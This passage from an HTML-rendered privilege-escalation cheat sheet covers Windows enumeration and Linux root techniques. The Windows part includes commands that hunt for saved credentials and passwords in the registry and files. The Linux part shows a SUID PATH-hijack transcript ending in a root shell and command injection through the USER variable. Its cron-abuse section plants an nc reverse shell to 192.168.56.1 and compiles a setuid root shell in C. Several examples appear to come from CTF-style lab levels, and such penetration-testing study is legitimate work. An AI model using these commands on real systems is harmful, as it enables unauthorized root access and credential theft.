<span class="n">SeCreateTokenPrivilege</span>
<span class="n">SeLoadDriverPrivilege</span>
<span class="n">SeTakeOwnershipPrivilege</span>
<span class="n">SeDebugPrivilege</span>
</pre></div>
</div>
<p>The above was for the Windows OS and the below is for Linux OS.</p>
</section>
<section id="credential-manager">
<h4>Credential Manager<a class="headerlink" href="#credential-manager" title="Link to this heading"></a></h4>
<p>Sometimes, the user might have save his credentials in the memory while using “runas /savecred” option. We could check this by</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cmdkey</span> <span class="o">/</span><span class="nb">list</span>
<span class="nb">dir</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">username</span>\<span class="n">AppData</span>\<span class="n">Local</span>\<span class="n">Microsoft</span>\<span class="n">Credentials</span>\
<span class="nb">dir</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">username</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Credentials</span>\
<span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="o">-</span><span class="n">Hidden</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">username</span>\<span class="n">AppData</span>\<span class="n">Local</span>\<span class="n">Microsoft</span>\<span class="n">Credentials</span>\
<span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="o">-</span><span class="n">Hidden</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">username</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Credentials</span>\
</pre></div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Sometimes, while using Metasploit web delivery method, if the reverse_https payload doesn’t work try reverse tcp maybe?</p>
</div>
</section>
<section id="other-enumeration">
<h4>Other Enumeration<a class="headerlink" href="#other-enumeration" title="Link to this heading"></a></h4>
<p>Mostly taken from <a class="reference external" href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">Windows Privilege Escalation Guide</a></p>
<p><strong>Environment Variables</strong> : A domain controller in LOGONSERVER?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">set</span>
<span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="n">Env</span><span class="p">:</span> <span class="o">|</span> <span class="n">ft</span> <span class="n">Key</span><span class="p">,</span><span class="n">Value</span>
</pre></div>
</div>
<p><strong>Connected Drives</strong></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>net use
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;}| ft Name,Root
</pre></div>
</div>
<p><strong>Users</strong></p>
<p>Who are you?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>whoami
echo %USERNAME%
$env:UserName
</pre></div>
</div>
<p>What users are on the system? Any old user profiles that weren’t cleaned up?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">users</span>
<span class="nb">dir</span> <span class="o">/</span><span class="n">b</span> <span class="o">/</span><span class="n">ad</span> <span class="s2">&quot;C:\Users</span><span class="se">\&quot;</span>
<span class="nb">dir</span> <span class="o">/</span><span class="n">b</span> <span class="o">/</span><span class="n">ad</span> <span class="s2">&quot;C:\Documents and Settings</span><span class="se">\&quot;</span><span class="s2"> # Windows XP and below</span>
<span class="n">Get</span><span class="o">-</span><span class="n">LocalUser</span> <span class="o">|</span> <span class="n">ft</span> <span class="n">Name</span><span class="p">,</span><span class="n">Enabled</span><span class="p">,</span><span class="n">LastLogon</span>
<span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span> <span class="o">-</span><span class="n">Force</span> <span class="o">|</span> <span class="n">select</span> <span class="n">Name</span>
</pre></div>
</div>
<p>Is anyone else logged in?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">qwinsta</span>
</pre></div>
</div>
<p>What groups are on the system?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">localgroup</span>
<span class="n">Get</span><span class="o">-</span><span class="n">LocalGroup</span> <span class="o">|</span> <span class="n">ft</span> <span class="n">Name</span>
</pre></div>
</div>
<p>Are any of the users in the Administrators group?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">localgroup</span> <span class="n">Administrators</span>
<span class="n">Get</span><span class="o">-</span><span class="n">LocalGroupMember</span> <span class="n">Administrators</span> <span class="o">|</span> <span class="n">ft</span> <span class="n">Name</span><span class="p">,</span> <span class="n">PrincipalSource</span>
</pre></div>
</div>
<p>Anything in the Registry for User Autologon?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span> <span class="mi">2</span><span class="o">&gt;</span><span class="n">nul</span> <span class="o">|</span> <span class="n">findstr</span> <span class="s2">&quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span>
<span class="n">Get</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="s1">&#39;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&#39;</span> <span class="o">|</span> <span class="n">select</span> <span class="s2">&quot;Default*&quot;</span>
</pre></div>
</div>
<p><strong>Programs</strong></p>
<p>What software is installed?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">dir</span> <span class="o">/</span><span class="n">a</span> <span class="s2">&quot;C:\Program Files&quot;</span>
<span class="nb">dir</span> <span class="o">/</span><span class="n">a</span> <span class="s2">&quot;C:\Program Files (x86)&quot;</span>
<span class="n">reg</span> <span class="n">query</span> <span class="n">HKEY_LOCAL_MACHINE</span>\<span class="n">SOFTWARE</span>
<span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="s1">&#39;C:\Program Files&#39;</span><span class="p">,</span> <span class="s1">&#39;C:\Program Files (x86)&#39;</span> <span class="o">|</span> <span class="n">ft</span> <span class="n">Parent</span><span class="p">,</span><span class="n">Name</span><span class="p">,</span><span class="n">LastWriteTime</span>
<span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="o">-</span><span class="n">path</span> <span class="n">Registry</span><span class="p">::</span><span class="n">HKEY_LOCAL_MACHINE</span>\<span class="n">SOFTWARE</span> <span class="o">|</span> <span class="n">ft</span> <span class="n">Name</span>
</pre></div>
</div>
<p><strong>Processes/ Services</strong></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">tasklist</span> <span class="o">/</span><span class="n">svc</span>
<span class="n">tasklist</span> <span class="o">/</span><span class="n">v</span>
<span class="n">net</span> <span class="n">start</span>
<span class="n">sc</span> <span class="n">query</span>
</pre></div>
</div>
<p>Get-Process has a -IncludeUserName option to see the process owner, however you have to have administrative rights to use it.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Get-Process | where {$_.ProcessName -notlike &quot;svchost*&quot;} | ft ProcessName, Id
Get-Service
</pre></div>
</div>
<p>This one liner returns the process owner without admin rights, if something is blank under owner it’s probably running as SYSTEM, NETWORK SERVICE, or LOCAL SERVICE.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Get-WmiObject -Query &quot;Select * from Win32_Process&quot; | where {$_.Name -notlike &quot;svchost*&quot;} | Select Name, Handle, @{Label=&quot;Owner&quot;;Expression={$_.GetOwner().User}} | ft -AutoSize
</pre></div>
</div>
<p><strong>Scheduled Tasks</strong></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>schtasks /query /fo LIST 2&gt;nul | findstr TaskName
dir C:\windows\tasks
Get-ScheduledTask | where {$_.TaskPath -notlike &quot;\Microsoft*&quot;} | ft TaskName,TaskPath,State
</pre></div>
</div>
<p><strong>Startup?</strong></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">wmic</span> <span class="n">startup</span> <span class="n">get</span> <span class="n">caption</span><span class="p">,</span><span class="n">command</span>
<span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span>\<span class="n">Software</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">CurrentVersion</span>\<span class="n">Run</span>
<span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span>\<span class="n">Software</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">CurrentVersion</span>\<span class="n">RunOnce</span>
<span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span>\<span class="n">Software</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">CurrentVersion</span>\<span class="n">Run</span>
<span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span>\<span class="n">Software</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">CurrentVersion</span>\<span class="n">RunOnce</span>
<span class="nb">dir</span> <span class="s2">&quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;</span>
<span class="nb">dir</span> <span class="s2">&quot;C:\Documents and Settings\</span><span class="si">%u</span><span class="s2">sername%\Start Menu\Programs\Startup&quot;</span>
</pre></div>
</div>
<p>Powershell</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">CimInstance</span> <span class="n">Win32_StartupCommand</span> <span class="o">|</span> <span class="n">select</span> <span class="n">Name</span><span class="p">,</span> <span class="n">command</span><span class="p">,</span> <span class="n">Location</span><span class="p">,</span> <span class="n">User</span> <span class="o">|</span> <span class="n">fl</span>
<span class="n">Get</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="s1">&#39;Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&#39;</span>
<span class="n">Get</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="s1">&#39;Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce&#39;</span>
<span class="n">Get</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="s1">&#39;Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&#39;</span>
<span class="n">Get</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="s1">&#39;Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&#39;</span>
<span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="s2">&quot;C:\Users\All Users\Start Menu\Programs\Startup&quot;</span>
<span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="s2">&quot;C:\Users\$env:USERNAME\Start Menu\Programs\Startup&quot;</span>
</pre></div>
</div>
<p><strong>Networking</strong></p>
<p>Firewall turned on? If so what’s configured?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">netsh</span> <span class="n">firewall</span> <span class="n">show</span> <span class="n">state</span>
<span class="n">netsh</span> <span class="n">firewall</span> <span class="n">show</span> <span class="n">config</span>
<span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="n">show</span> <span class="n">rule</span> <span class="n">name</span><span class="o">=</span><span class="nb">all</span>
<span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">export</span> <span class="s2">&quot;firewall.txt&quot;</span>
</pre></div>
</div>
<p>Interesting interface configurations?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">netsh</span> <span class="n">dump</span>
</pre></div>
</div>
<p>SNMP configurations</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span>\<span class="n">SYSTEM</span>\<span class="n">CurrentControlSet</span>\<span class="n">Services</span>\<span class="n">SNMP</span> <span class="o">/</span><span class="n">s</span>
<span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="o">-</span><span class="n">path</span> <span class="n">HKLM</span><span class="p">:</span>\<span class="n">SYSTEM</span>\<span class="n">CurrentControlSet</span>\<span class="n">Services</span>\<span class="n">SNMP</span> <span class="o">-</span><span class="n">Recurse</span>
</pre></div>
</div>
<p><strong>Sensitive Files</strong></p>
<p>passwords in the registry?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span> <span class="o">/</span><span class="n">f</span> <span class="n">password</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="o">/</span><span class="n">s</span>
<span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span> <span class="o">/</span><span class="n">f</span> <span class="n">password</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="o">/</span><span class="n">s</span>
</pre></div>
</div>
<p>Interesting files to look at? Possibly inside User directories (Desktop, Documents, etc)?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>dir /s *pass* == *vnc* == *.config* 2&gt;nul
Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
</pre></div>
</div>
<p>Files containing password inside them?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">findstr</span> <span class="o">/</span><span class="n">si</span> <span class="n">password</span> <span class="o">*.</span><span class="n">xml</span> <span class="o">*.</span><span class="n">ini</span> <span class="o">*.</span><span class="n">txt</span> <span class="o">*.</span><span class="n">config</span> <span class="mi">2</span><span class="o">&gt;</span><span class="n">nul</span>
<span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="n">C</span><span class="p">:</span>\<span class="o">*</span> <span class="o">-</span><span class="n">include</span> <span class="o">*.</span><span class="n">xml</span><span class="p">,</span><span class="o">*.</span><span class="n">ini</span><span class="p">,</span><span class="o">*.</span><span class="n">txt</span><span class="p">,</span><span class="o">*.</span><span class="n">config</span> <span class="o">-</span><span class="n">Recurse</span> <span class="o">-</span><span class="n">ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="o">|</span> <span class="n">Select</span><span class="o">-</span><span class="n">String</span> <span class="o">-</span><span class="n">Pattern</span> <span class="s2">&quot;password&quot;</span>
</pre></div>
</div>
</section>
</section>
<section id="linux-privilege-escalation">
<h3>Linux Privilege Escalation<a class="headerlink" href="#linux-privilege-escalation" title="Link to this heading"></a></h3>
<p>Techniques for Linux privilege escalation:</p>
</section>
<section id="privilege-escalation-from-g0tm1lk-blog">
<h3>Privilege escalation from g0tm1lk blog<a class="headerlink" href="#privilege-escalation-from-g0tm1lk-blog" title="Link to this heading"></a></h3>
<p>Once, we have got the unprivileged shell, it is very important to check the below things</p>
<ul class="simple">
<li><p>Did you tried “sudo -l” and check if we have any binaries which can be executed as root?</p></li>
<li><p>Are there any binaries with Sticky, suid, guid.</p></li>
<li><p>Are there any world-writable folders, files.</p></li>
<li><p>Are there any world-execuable files.</p></li>
<li><p>Which are the files owned by nobody (No user)</p></li>
<li><p>Which are the files which are owned by a particular user but are not present in their home directory. (Mostly, the users have files and folders in /home directory. However, that’s not always the case.)</p></li>
<li><p>What are the processes running on the machines? (ps aux). Remember, If something like knockd is running, we would come to know that Port Knocking is required.</p></li>
<li><p>What are the packages installed? (dpkg -l for debian) (pip list for python packages). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49 or couchdb 1.7).</p></li>
<li><p>What are the services running? (netstat -ln)</p></li>
<li><p>Check the entries in the crontab!</p></li>
<li><p>What are the files present in the /home/user folder? Are there any hidden files and folders? like .thunderbird/ .bash_history etc.</p></li>
<li><p>What groups does the user belong to (adm, audio, video, disk)?</p></li>
<li><p>What other users are logged on the linux box (command w)?</p></li>
</ul>
<section id="what-advanced-linux-file-permissions-are-used">
<h4>What “Advanced Linux File Permissions” are used?<a class="headerlink" href="#what-advanced-linux-file-permissions-are-used" title="Link to this heading"></a></h4>
<p>Sticky bits, SUID &amp; GUID</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID
for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null
</pre></div>
</div>
</section>
<section id="where-can-written-to-and-executed-from">
<h4>Where can written to and executed from?<a class="headerlink" href="#where-can-written-to-and-executed-from" title="Link to this heading"></a></h4>
<p>A few ‘common’ places: /tmp, /var/tmp, /dev/shm</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">writable</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>      <span class="c1"># world-writeable folders</span>
<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">222</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-writeable folders</span>
<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span><span class="o">+</span><span class="n">w</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-writeable folders</span>
<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span><span class="o">+</span><span class="n">w</span> <span class="o">-</span><span class="nb">type</span> <span class="n">f</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-writeable files</span>
<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="nb">type</span> <span class="n">f</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span><span class="o">+</span><span class="n">w</span> <span class="o">-</span><span class="ow">not</span> <span class="o">-</span><span class="nb">type</span> <span class="n">l</span> <span class="o">-</span><span class="ow">not</span> <span class="o">-</span><span class="n">path</span> <span class="s2">&quot;/proc/*&quot;</span> <span class="o">-</span><span class="ow">not</span> <span class="o">-</span><span class="n">path</span> <span class="s2">&quot;/sys/*&quot;</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="c1"># world-writeable files</span>

<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span><span class="o">+</span><span class="n">x</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-executable folders</span>
<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span><span class="o">+</span><span class="n">x</span> <span class="o">-</span><span class="nb">type</span> <span class="n">f</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-executable files</span>

<span class="n">find</span> <span class="o">/</span> \<span class="p">(</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span><span class="o">+</span><span class="n">w</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span><span class="o">+</span><span class="n">x</span> \<span class="p">)</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>   <span class="c1"># world-writeable &amp; executable folders</span>
</pre></div>
</div>
</section>
<section id="any-problem-files">
<h4>Any “problem” files?<a class="headerlink" href="#any-problem-files" title="Link to this heading"></a></h4>
<p>Word-writeable, “nobody” files</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
</pre></div>
</div>
</section>
<section id="find-files-folder-owned-by-the-user">
<h4>Find files/ folder owned by the user<a class="headerlink" href="#find-files-folder-owned-by-the-user" title="Link to this heading"></a></h4>
<p>After compromising the machine with an unprivileged shell, /home would contains the users present on the system. Also, viewable by checking /etc/passwd. Many times, we do want to see if there are any files owned by those users outside their home directory.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">user</span> <span class="n">username</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">group</span> <span class="n">groupname</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
</pre></div>
</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>Find files by wheel/ adm users or the users in the home directory. If the user is member of other groups (such as audio, video, disk), it might be a good idea to check for files owned by particular groups.</p>
</div>
</section>
</section>
<section id="other-linux-privilege-escalation">
<h3>Other Linux Privilege Escalation<a class="headerlink" href="#other-linux-privilege-escalation" title="Link to this heading"></a></h3>
<section id="execution-of-binary-from-relative-location-than-absolute">
<h4>Execution of binary from Relative location than Absolute<a class="headerlink" href="#execution-of-binary-from-relative-location-than-absolute" title="Link to this heading"></a></h4>
<p>If we figure out that a suid binary is running with relative locations (for example let’s say backjob is running “id” and “scp /tmp/special <a class="reference external" href="mailto:ron&#37;&#52;&#48;ton&#46;home">ron<span>&#64;</span>ton<span>&#46;</span>home</a>”)(figured out by running strings on the binary). The problem with this is, that it’s trying to
execute a file/ script/ program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.</p>
<p>Something like this:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;/usr/bin/env echo and now what?&quot;</span><span class="p">);</span>
</pre></div>
</div>
<p>so we can create a file in temp:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;/bin/sh&quot;</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="nb">id</span>
<span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="nb">id</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>www-data@yummy:/tmp$ echo &quot;/bin/sh&quot; &gt;&gt; /tmp/id
www-data@yummy:/tmp$ export PATH=/tmp:$PATH
www-data@yummy:/tmp$ which id
/tmp/id
www-data@yummy:/tmp$ /opt/backjob
whoami
root
# /usr/bin/id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
</pre></div>
</div>
<p>By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or “id” . So the chain of commands is:</p>
<ul class="simple">
<li><p>/opt/backjob switches user context to root (as it is suid) and tries to run “scp or id”</p></li>
<li><p>Linux searches the filesystem according to its path (here: in /tmp first)</p></li>
<li><p>Our malicious /tmp/scp or /tmp/id gets found and executed as root</p></li>
<li><p>A new bash opens with root privileges.</p></li>
</ul>
<p>If we execute a binary without specifying an absolute paths, it goes in order of your $PATH variable. By default, it’s something like:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span>
</pre></div>
</div>
<p>It is important to see .bash_profile file which contains the $PATH</p>
</section>
<section id="environment-variable-abuse">
<h4>Environment Variable Abuse<a class="headerlink" href="#environment-variable-abuse" title="Link to this heading"></a></h4>
<p>If the suid binary contains a code like</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s2">&quot;/bin/echo </span><span class="si">%s</span><span class="s2"> is cool&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;USER&quot;</span><span class="p">));</span>
<span class="n">printf</span><span class="p">(</span><span class="s2">&quot;about to call system(</span><span class="se">\&quot;</span><span class="si">%s</span><span class="se">\&quot;</span><span class="s2">)</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</pre></div>
</div>
<p>We can see that it is accepting environment variable USER which can be user-controlled. In that case just define USER variable to</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">USER</span><span class="o">=</span><span class="s2">&quot;;/bin/sh;&quot;</span>
</pre></div>
</div>
<p>When the program is executed, USER variable will contain /bin/sh and will be executed on system call.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>echo $USER
;/bin/sh;

levelXX@:/home/flagXX$ ./flagXX
about to call system(&quot;/bin/echo ;/bin/sh; is cool&quot;)

sh-4.2$ id
uid=997(flagXX) gid=1003(levelXX) groups=997(flagXX),1003(levelXX)
</pre></div>
</div>
</section>
<section id="world-writable-folder-with-a-script-executing-any-file-in-that-folder-using-crontab">
<h4>World-Writable Folder with a Script executing any file in that folder using crontab<a class="headerlink" href="#world-writable-folder-with-a-script-executing-any-file-in-that-folder-using-crontab" title="Link to this heading"></a></h4>
<p>If there exists any world-writeable folder plus if there exists a cronjob which executes any script in that world-writeable folder such as</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/bin/sh</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">writable</span><span class="o">.</span><span class="n">d</span><span class="o">/*</span> <span class="p">;</span> <span class="n">do</span>
       <span class="p">(</span><span class="n">ulimit</span> <span class="o">-</span><span class="n">t</span> <span class="mi">5</span><span class="p">;</span> <span class="n">bash</span> <span class="o">-</span><span class="n">x</span> <span class="s2">&quot;$i&quot;</span><span class="p">)</span>
       <span class="n">rm</span> <span class="o">-</span><span class="n">f</span> <span class="s2">&quot;$i&quot;</span>
<span class="n">done</span>
</pre></div>
</div>
<p>then either we can create a script in that folder /home/flagXX/writeable.d which gives us a reverse shell like</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;/bin/nc.traditional -e /bin/sh 192.168.56.1 22&quot;</span> <span class="o">&gt;</span> <span class="n">hello</span><span class="o">.</span><span class="n">sh</span>
</pre></div>
</div>
<p>or</p>
<p>we can create a suid file to give us the privileged user permission</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/bin/sh</span>
<span class="n">gcc</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span>
<span class="n">chmod</span> <span class="mi">4777</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flagXX</span>
</pre></div>
</div>
<p>Considering shell.c contains</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span> <span class="p">{</span>
<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">execl</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;sh&quot;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> <span class="p">}</span>
</pre></div>
</div>
</section>
<section id="symlink-creation">
<h4>Symlink Creation<a class="headerlink" href="#symlink-creation" title="Link to this heading"></a></h4>
